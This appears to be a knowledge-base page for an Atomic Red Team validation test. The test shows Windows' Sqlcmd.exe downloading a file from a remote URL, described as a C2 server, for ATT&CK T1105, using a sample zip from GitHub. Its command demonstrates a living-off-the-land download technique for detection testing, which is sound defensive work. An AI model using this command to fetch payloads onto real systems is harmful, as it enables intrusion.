---
atomic_guid: "6934c16e-0b3a-4e7f-ab8c-c414acd32181"
title: "File Download with Sqlcmd.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "6934c16e-0b3a-4e7f-ab8c-c414acd32181"
  - "File Download with Sqlcmd.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# File Download with Sqlcmd.exe

One of the windows packages 'Sqlcmd.exe' can be abused to download malicious files from C2 servers
This Atomic will exhibit the similar behavior by downloading a sample zip file from src directory of this Technique folder via GitHub URL

## Metadata

- Atomic GUID: 6934c16e-0b3a-4e7f-ab8c-c414acd32181
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### local_file_path

- description: The local file path along with filename to where the file needs to be downloaded and placed.
- type: path
- default: C:\T1105.zip

### remote_url

- description: URL of the C2 Server from where file/s need to be downloaded
- type: url
- default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip

## Dependencies

Windows package 'Sqlcmd' need to be available in the machine to execute this atomic successfully

### Prerequisite Check

```powershell
if (Get-Command sqlcmd 2>$null) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
winget install Microsoft.Sqlcmd --silent 2>$null | Out-Null
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
sqlcmd -i #{remote_url} -o #{local_file_path}
```

### Cleanup

```powershell
rm "#{local_file_path}" 2>$null | Out-Null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
